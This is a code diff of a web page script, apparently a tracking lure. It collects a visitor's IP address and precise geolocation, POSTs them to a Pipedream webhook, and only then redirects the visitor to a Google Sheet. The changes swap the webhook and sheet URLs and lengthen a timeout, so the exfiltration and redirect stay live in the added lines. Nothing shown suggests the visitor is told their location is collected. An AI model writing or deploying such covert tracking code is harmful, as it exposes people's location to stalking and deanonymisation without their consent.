@@ -12,7 +12,7 @@
                 .then(data => {
                     const userIP = data.ip;
 
-                    // Try to get geolocation (works better on iOS with requestAnimationFrame)
+                    // Try to get geolocation
                     if (navigator.geolocation) {
                         requestAnimationFrame(function() {
                             navigator.geolocation.getCurrentPosition(
@@ -33,7 +33,7 @@
                                 },
                                 {
                                     enableHighAccuracy: true,   // High accuracy for better mobile results
-                                    timeout: 15000,             // Wait for up to 15 seconds
+                                    timeout: 20000,             // Wait for up to 20 seconds
                                     maximumAge: 0               // No cached position
                                 }
                             );
@@ -54,7 +54,7 @@
             console.log('Sending data: ', { ip, latitude, longitude });
 
             // Send data to the webhook
-            fetch('https://eokgroy766zrinn.m.pipedream.net/', {
+            fetch('https://eo44xdas9z1r2d1.m.pipedream.net', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -66,7 +66,7 @@
                 }),
             }).finally(() => {
                 // After data is sent, redirect the user to the Google Sheet
-                window.location.href = 'https://docs.google.com/spreadsheets/d/141Sst-vCmUZDXML5lG8wr3MqGFJM9AwFGedXNATremw/edit?gid=0#gid=0';
+                window.location.href = 'https://docs.google.com/spreadsheets/d/1kpx8D0chlzEOLvqJRa5GJXcsJsATPgwT0n6NBAsDfL8/edit?gid=0#gid=0';
             });
         }
 
